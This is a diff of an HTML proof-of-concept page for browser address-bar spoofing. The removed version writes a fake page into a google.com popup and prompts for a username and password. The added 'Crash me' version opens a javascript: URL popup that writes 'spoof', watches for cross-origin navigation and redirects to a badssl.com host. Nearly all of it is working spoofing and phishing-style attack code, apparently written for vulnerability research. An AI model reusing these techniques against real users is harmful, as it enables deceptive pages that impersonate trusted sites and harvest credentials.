@@ -1,135 +1,103 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Browser Security Demo</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Crash me (centered & bigger)</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    /* center the page content both horizontally and vertically */
     html, body {
-      width: 100%;
       height: 100%;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      margin: 0;
     }
-
     body {
       display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      gap: 30px;
-      padding: 20px;
+      align-items: center;       /* vertical center */
+      justify-content: center;   /* horizontal center */
+      background: #f3f4f6;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
     }
 
-    .container {
-      background: white;
-      padding: 40px;
+    /* style the link so it looks like a big button */
+    a.crash-link {
+      display: inline-block;
+      font-size: 56px;           /* make it big — change as needed */
+      font-weight: 700;
+      text-decoration: none;
+      padding: 18px 36px;
       border-radius: 12px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-      max-width: 600px;
-      text-align: center;
-    }
-
-    h1 {
-      color: #333;
-      margin-bottom: 20px;
-      font-size: 28px;
-    }
-
-    .warning {
-      background: #fff3cd;
-      border: 2px solid #ffc107;
-      border-radius: 8px;
-      padding: 15px;
-      margin: 20px 0;
-      color: #856404;
-    }
-
-    .demo-button {
-      padding: 15px 30px;
-      font-size: 18px;
-      border-radius: 8px;
-      background-color: #667eea;
-      color: white;
-      border: none;
+      background: #ffdddd;
+      color: #a00;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
       cursor: pointer;
-      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
-      transition: all 0.3s ease;
-      margin: 10px;
+      user-select: none;
     }
 
-    .demo-button:hover {
-      background-color: #5568d3;
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
-    }
-
-    .info {
-      background: #e7f3ff;
-      border-left: 4px solid #2196F3;
-      padding: 15px;
-      margin: 20px 0;
-      text-align: left;
-    }
-
-    .flag-hunt {
-      background: #f0f0f0;
-      padding: 20px;
-      border-radius: 8px;
-      margin-top: 20px;
-      font-family: monospace;
-    }
-
-    code {
-      background: #f4f4f4;
-      padding: 2px 6px;
-      border-radius: 3px;
-      font-family: monospace;
-    }
+    a.crash-link:active { transform: translateY(1px); }
+    a.crash-link:hover  { filter: brightness(0.98); }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🔒 Browser Security Demonstration</h1>
-    
 
-
-    <button class="demo-button" onclick="safeDemo()">POC</button>
-
-    <div class="flag-hunt">
-      <strong>Browser Blank Address Bar Lead Spoof</strong><br>
-    </div>
-  </div>
+  <a href="#" class="crash-link" onclick="f(); return false;">Crash me</a>
 
   <script>
-    function safeDemo() {
-      // Open a new window
-      let win = window.open("https://www.google.com/", "_blank");
-      
-      // Attempt to write content (will be blocked by modern browsers for cross-origin)
-      setTimeout(() => {
-        try {
-           win.document.write(`
-  <h1>This is not Google!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
-            `);
-          win.document.close();
-          console.log("✅ Content injection succeeded (about:blank only)");
-        } catch (e) {
-          console.warn("Blocked by browser protections:", e);
-          alert("Browser security blocked the injection (this is good!)");
+    // make variables local to avoid polluting global scope
+    let w = null;
+    let watcher = null;
+
+    function next() {
+      // original behavior: replace location of the popup (or main window if desired)
+      try {
+        if (w && !w.closed) {
+          // attempt to redirect the popup
+          w.location.replace('http://wrong.host.badssl.com/');
+        } else {
+          // fallback: if popup already closed, redirect the current page
+          window.location.replace('http://wrong.host.badssl.com/');
         }
-      }, 50);
+      } catch (e) {
+        // If cross-origin prevents us, at least ensure the interval is cleared
+        console.error('next() error:', e);
+      }
+    }
+
+    function f() {
+      // open a new window. This uses a javascript: URL like your original,
+      // but note: browsers sometimes block or sanitize `javascript:` URLs.
+      w = window.open(
+        "javascript:document.write('spoof');location='http://twitter.com'",
+        "new",
+        "width=500,height=500"
+      );
+
+      // clear any previous watcher
+      if (watcher) {
+        clearInterval(watcher);
+        watcher = null;
+      }
+
+      // poll safely with a small but reasonable interval (not 1ms)
+      watcher = setInterval(function () {
+        try {
+          // accessing w.location.href will throw if popup navigated cross-origin
+          // or if the window is closed. That's the original detection mechanism.
+          const x = w.location.href;
+          // if you want, you can log or inspect x here:
+          // console.log('popup href:', x);
+        } catch (e) {
+          // when access throws, run next() (as in your original PoC)
+          clearInterval(watcher);
+          watcher = null;
+          next();
+        }
+
+        // if the popup gets closed by user, stop the watcher
+        if (!w || w.closed) {
+          clearInterval(watcher);
+          watcher = null;
+        }
+      }, 100); // 100ms is responsive but not wasteful
     }
   </script>
 </body>
